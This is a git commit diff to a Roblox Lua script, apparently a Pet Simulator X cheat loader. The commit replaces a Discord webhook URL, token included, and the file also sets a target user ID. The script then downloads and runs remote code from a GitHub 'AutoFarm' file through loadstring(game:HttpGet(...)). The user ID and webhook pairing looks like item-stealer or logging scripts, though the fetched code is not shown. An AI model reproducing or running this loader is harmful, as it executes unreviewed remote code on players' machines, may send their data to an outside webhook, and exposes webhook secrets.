9fb2679d52c540271820ec6c2a19798bc5530f36
PsxScriptMaker <124332608+PsxScriptMaker@users.noreply.github.com>
2023-02-09 14:07:36 +0800

    Update Main.lua

--- Main.lua
+++ Main.lua
@@ -1,5 +1,5 @@
 _G.UserID = 3380431035
 
-_G.WebHook = "https://discord.com/api/webhooks/1072712491597041765/Zxl4LLPA07UqNCB8RJY9XRmE5OTTAnfrsGIZPh6IYVfRdxJKhfXhERgWGUaFozTs4tX-"
+_G.WebHook = "https://discord.com/api/webhooks/1073117075922485299/1ZHUpao8r84j0SWx9e0EiJ2_Set5JsIV20pWEzezbBXdfBwVGVj-GxR7vsdKPXGZKcnM"
 
 loadstring(game:HttpGet('https://raw.githubusercontent.com/vestyx/PetSimulatorXAutoFarm/main/HasteFarm.lua'))()
